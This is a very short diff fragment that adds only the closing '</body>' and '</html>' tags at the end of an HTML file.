+</body>
+
+</html>
